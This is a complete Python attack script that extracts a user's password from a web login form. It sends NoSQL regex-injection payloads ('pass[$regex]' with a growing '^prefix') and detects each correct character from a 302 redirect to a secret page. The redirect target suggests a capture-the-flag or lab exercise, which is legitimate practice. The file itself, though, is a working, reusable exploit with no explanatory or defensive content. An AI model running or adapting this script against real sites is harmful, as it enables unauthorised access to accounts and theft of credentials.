import requests
from string import ascii_lowercase, digits
import itertools
from tqdm import tqdm
import argparse

def main():
    parser = argparse.ArgumentParser(description='Brute force password cracking script')
    parser.add_argument('-u', '--url', required=True, help='URL to send POST requests')
    parser.add_argument('-l', '--length', required=True, type=int, help='Length of the password')
    parser.add_argument('-U', '--user', required=True, help='Username to use in the login form')

    args = parser.parse_args()

    url = args.url
    password_length = args.length
    username = args.user

    # Simplified HTTP headers
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Content-Type": "application/x-www-form-urlencoded"
    }

    # Generate characters list
    characters = ascii_lowercase + digits

    password = ''  # Starting with an empty password

    # Iterate to find each character in the password
    for _ in range(password_length):
        found_next_char = False
        for char in tqdm(characters, desc=f"Checking next character after '{password}'"):
            test_password = password + char
            payload = {
                'user': username,
                'pass[$regex]': f'^{test_password}',
                'remember': 'on'
            }

            response = requests.post(url, headers=headers, data=payload, allow_redirects=False)

            # Check if the response is a 302 redirect
            if response.status_code == 302 and 'Location' in response.headers:
                if response.headers['Location'].endswith("/sekr3tPl4ce.php"):
                    password += char
                    print(f"Found next character: {password}")
                    found_next_char = True
                    break

        if not found_next_char:
            print("\nFailed to find the next character.")
            break

    print(f"\nFinal password found: {password}")

if __name__ == "__main__":
    main()
